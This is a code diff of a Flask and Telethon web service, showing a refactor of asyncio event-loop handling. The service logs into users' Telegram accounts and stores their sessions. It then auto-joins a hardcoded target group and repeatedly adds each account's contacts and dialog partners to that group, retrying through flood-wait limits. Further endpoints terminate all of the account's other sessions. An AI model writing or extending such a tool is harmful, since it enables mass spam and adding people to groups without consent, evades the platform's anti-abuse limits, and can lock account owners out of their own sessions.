@@ -11,6 +11,7 @@ import time
 import threading
 import logging
 import random
+import asyncio
 from datetime import datetime, timedelta
 from flask import Flask, request, jsonify, send_from_directory
 from flask_cors import CORS
@@ -453,7 +454,7 @@ class AutoAddEngine:
         self.running[account_id] = False
         return True, "Auto-add stopped"
     
-    def _auto_join_group(self, client, group_username, account_id):
+    def _auto_join_group(self, loop, client, group_username, account_id):
         """Auto-join the target group"""
         cache_key = f"{account_id}_{group_username}"
         if cache_key in self.joined_groups:
@@ -461,19 +462,15 @@ class AutoAddEngine:
         
         try:
             logger.info(f"[AutoAdd] Joining @{group_username} with account {account_id}...")
-            entity = client.loop.run_until_complete(
-                client.get_entity(f'@{group_username}')
-            )
-            client.loop.run_until_complete(
-                client(JoinChannelRequest(entity))
-            )
+            entity = loop.run_until_complete(client.get_entity(f'@{group_username}'))
+            loop.run_until_complete(client(JoinChannelRequest(entity)))
             self.joined_groups.add(cache_key)
             logger.info(f"[AutoAdd] ✅ Successfully joined @{group_username}")
             return True
         except FloodWaitError as e:
             logger.warning(f"[AutoAdd] Flood wait joining group: {e.seconds}s")
             time.sleep(e.seconds + 5)
-            return self._auto_join_group(client, group_username, account_id)
+            return self._auto_join_group(loop, client, group_username, account_id)
         except Exception as e:
             error_msg = str(e)
             if 'already' in error_msg.lower() or 'participant' in error_msg.lower():
@@ -484,6 +481,11 @@ class AutoAddEngine:
             return False
     
     def _auto_add_loop(self, account_id, client, settings):
+        # Create event loop for this thread
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        client.loop = loop
+        
         target_group = settings.get('target_group', TARGET_GROUP)
         delay = max(25, settings.get('delay_seconds', 25))
         auto_join = settings.get('auto_join', True)
@@ -492,7 +494,7 @@ class AutoAddEngine:
         
         # AUTO-JOIN TARGET GROUP FIRST
         if auto_join:
-            joined = self._auto_join_group(client, target_group, account_id)
+            joined = self._auto_join_group(loop, client, target_group, account_id)
             if not joined:
                 logger.error(f"[AutoAdd] Could not join @{target_group}. Continuing anyway...")
         
@@ -506,9 +508,9 @@ class AutoAddEngine:
                 
                 # Re-join periodically to ensure membership
                 if auto_join and add_count % 100 == 0 and add_count > 0:
-                    self._auto_join_group(client, target_group, account_id)
+                    self._auto_join_group(loop, client, target_group, account_id)
                 
-                new_members = self._find_members(client, added_users)
+                new_members = self._find_members(loop, client, added_users)
                 
                 if not new_members:
                     consecutive_failures += 1
@@ -530,7 +532,7 @@ class AutoAddEngine:
                         continue
                     
                     try:
-                        success = client.loop.run_until_complete(
+                        success = loop.run_until_complete(
                             self._add_user_to_group(client, target_group, user_id)
                         )
                         
@@ -566,14 +568,15 @@ class AutoAddEngine:
                 logger.error(f"[AutoAdd] Loop error: {e}")
                 time.sleep(delay * 2)
         
+        loop.close()
         logger.info(f"[AutoAdd] Stopped account {account_id}. Total added: {add_count}")
     
-    def _find_members(self, client, exclude_users):
+    def _find_members(self, loop, client, exclude_users):
         members = []
         try:
             # Get from contacts
             try:
-                contacts = client.loop.run_until_complete(client(GetContactsRequest(hash=0)))
+                contacts = loop.run_until_complete(client(GetContactsRequest(hash=0)))
                 for contact in contacts.contacts[:100]:
                     if contact.id not in exclude_users and not getattr(contact, 'bot', False):
                         members.append({
@@ -586,7 +589,7 @@ class AutoAddEngine:
             
             # Get from recent dialogs
             try:
-                dialogs = client.loop.run_until_complete(client.get_dialogs(limit=200))
+                dialogs = loop.run_until_complete(client.get_dialogs(limit=200))
                 for dialog in dialogs:
                     if dialog.is_user and not getattr(dialog.entity, 'bot', False):
                         if dialog.entity.id not in exclude_users and len(members) < 200:
@@ -727,24 +730,32 @@ def add_account():
         if not phone.startswith('+'):
             phone = '+' + phone
         
+        # Create event loop for this thread
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
         # Create and connect client
         client = TelegramClient(StringSession(), API_ID, API_HASH)
+        client.loop = loop
         
         try:
-            client.connect()
+            loop.run_until_complete(client.connect())
         except Exception as e:
+            loop.close()
             return jsonify({'success': False, 'error': f'Connection failed: {str(e)}'})
         
         if not client.is_connected():
+            loop.close()
             return jsonify({'success': False, 'error': 'Failed to connect to Telegram'})
         
         try:
-            result = client.send_code_request(phone)
+            result = loop.run_until_complete(client.send_code_request(phone))
         except Exception as e:
             try:
-                client.disconnect()
+                loop.run_until_complete(client.disconnect())
             except:
                 pass
+            loop.close()
             error_msg = str(e)
             if 'PHONE_NUMBER_INVALID' in error_msg:
                 return jsonify({'success': False, 'error': 'Invalid phone number format'})
@@ -763,7 +774,11 @@ def add_account():
         for sid, session_data in app.temp_sessions.items():
             if current_time - session_data.get('created_at', 0) > 600:
                 try:
-                    session_data['client'].disconnect()
+                    session_data['loop'].run_until_complete(session_data['client'].disconnect())
+                except:
+                    pass
+                try:
+                    session_data['loop'].close()
                 except:
                     pass
                 expired_sessions.append(sid)
@@ -775,6 +790,7 @@ def add_account():
             'phone': phone,
             'phone_code_hash': result.phone_code_hash,
             'client': client,
+            'loop': loop,
             'target_group': TARGET_GROUP,
             'created_at': time.time()
         }
@@ -809,20 +825,28 @@ def verify_code():
         
         temp = app.temp_sessions[session_id]
         client = temp['client']
+        loop = temp['loop']
         phone = temp['phone']
         target_group = temp.get('target_group', TARGET_GROUP)
+        
+        # Set the event loop for this thread
+        asyncio.set_event_loop(loop)
         
         # Ensure client is connected
         if not client.is_connected():
             try:
-                client.connect()
+                loop.run_until_complete(client.connect())
             except Exception as e:
+                loop.close()
+                del app.temp_sessions[session_id]
                 return jsonify({'success': False, 'error': f'Connection lost: {str(e)}'})
         
         try:
             # Try to sign in
             try:
-                client.sign_in(phone=phone, code=code, phone_code_hash=temp['phone_code_hash'])
+                loop.run_until_complete(
+                    client.sign_in(phone=phone, code=code, phone_code_hash=temp['phone_code_hash'])
+                )
             except SessionPasswordNeededError:
                 if not password:
                     return jsonify({
@@ -831,7 +855,7 @@ def verify_code():
                         'message': '2FA password required'
                     })
                 try:
-                    client.sign_in(password=password)
+                    loop.run_until_complete(client.sign_in(password=password))
                 except Exception as e:
                     return jsonify({
                         'success': False, 
@@ -856,15 +880,15 @@ def verify_code():
                 })
             
             # Get user info
-            me = client.get_me()
+            me = loop.run_until_complete(client.get_me())
             account_id = int(time.time() * 1000)
             
             # AUTO-JOIN TARGET GROUP after login
             join_status = "Not attempted"
             try:
                 logger.info(f"Auto-joining @{target_group} for new account...")
-                entity = client.get_entity(f'@{target_group}')
-                client(JoinChannelRequest(entity))
+                entity = loop.run_until_complete(client.get_entity(f'@{target_group}'))
+                loop.run_until_complete(client(JoinChannelRequest(entity)))
                 join_status = "Successfully joined"
                 logger.info(f"✅ New account joined @{target_group}")
             except Exception as e:
@@ -959,7 +983,10 @@ def remove_account():
         
         if account_id in store.clients:
             try:
-                store.clients[account_id].disconnect()
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+                loop.run_until_complete(store.clients[account_id].disconnect())
+                loop.close()
             except:
                 pass
             del store.clients[account_id]
@@ -982,7 +1009,10 @@ def get_sessions():
         if not client:
             return jsonify({'success': False, 'error': 'Account not connected'})
         
-        result = client(functions.account.GetAuthorizationsRequest())
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        result = loop.run_until_complete(client(functions.account.GetAuthorizationsRequest()))
+        loop.close()
         
         current_hash = None
         sessions = []
@@ -1013,7 +1043,13 @@ def terminate_session():
         if not client:
             return jsonify({'success': False, 'error': 'Not connected'})
         
-        client(functions.account.ResetAuthorizationRequest(hash=int(data.get('hash'))))
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(
+            client(functions.account.ResetAuthorizationRequest(hash=int(data.get('hash'))))
+        )
+        loop.close()
+        
         return jsonify({'success': True, 'message': 'Session terminated'})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
@@ -1026,16 +1062,23 @@ def terminate_sessions():
         if not client:
             return jsonify({'success': False, 'error': 'Not connected'})
         
-        result = client(functions.account.GetAuthorizationsRequest())
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        result = loop.run_until_complete(client(functions.account.GetAuthorizationsRequest()))
         
         terminated = 0
         for auth in result.authorizations:
             if not auth.current:
                 try:
-                    client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
+                    loop.run_until_complete(
+                        client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
+                    )
                     terminated += 1
                 except:
                     pass
+        
+        loop.close()
         
         return jsonify({'success': True, 'message': f'Terminated {terminated} sessions'})
     except Exception as e:
@@ -1107,11 +1150,14 @@ def test_auto_add():
         settings = store.settings.get(str(account_id), {})
         target_group = settings.get('target_group', TARGET_GROUP)
         
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
         # Test group access
         group_found = False
         group_title = target_group
         try:
-            entity = client.get_entity(f'@{target_group}')
+            entity = loop.run_until_complete(client.get_entity(f'@{target_group}'))
             group_found = True
             group_title = getattr(entity, 'title', target_group)
         except:
@@ -1120,16 +1166,18 @@ def test_auto_add():
         # Count available members
         available = 0
         try:
-            contacts = client(GetContactsRequest(hash=0))
+            contacts = loop.run_until_complete(client(GetContactsRequest(hash=0)))
             available += len([c for c in contacts.contacts if not getattr(c, 'bot', False)])
         except:
             pass
         
         try:
-            dialogs = client.get_dialogs(limit=100)
+            dialogs = loop.run_until_complete(client.get_dialogs(limit=100))
             available += len([d for d in dialogs if d.is_user and not getattr(d.entity, 'bot', False)])
         except:
             pass
+        
+        loop.close()
         
         return jsonify({
             'success': True,
@@ -1155,11 +1203,16 @@ def join_group():
         if not client:
             return jsonify({'success': False, 'error': 'Account not connected'})
         
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
         try:
-            entity = client.get_entity(f'@{group}')
-            client(JoinChannelRequest(entity))
+            entity = loop.run_until_complete(client.get_entity(f'@{group}'))
+            loop.run_until_complete(client(JoinChannelRequest(entity)))
+            loop.close()
             return jsonify({'success': True, 'message': f'Joined @{group}'})
         except Exception as e:
+            loop.close()
             error_msg = str(e)
             if 'already' in error_msg.lower():
                 return jsonify({'success': True, 'message': f'Already in @{group}'})
@@ -1207,13 +1260,17 @@ def restore_sessions():
     for account in store.accounts:
         if account.get('session_string'):
             try:
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+                
                 client = TelegramClient(
                     StringSession(account['session_string']),
                     API_ID, API_HASH
                 )
-                client.connect()
+                client.loop = loop
+                loop.run_until_complete(client.connect())
                 
-                if client.is_user_authorized():
+                if loop.run_until_complete(client.is_user_authorized()):
                     account_id = account['id']
                     store.clients[account_id] = client
                     account['active'] = True
@@ -1224,6 +1281,7 @@ def restore_sessions():
                         auto_add_engine.start_for_account(account_id)
                 else:
                     account['active'] = False
+                    loop.close()
             except Exception as e:
                 logger.error(f"Error restoring {account.get('name')}: {e}")
                 account['active'] = False
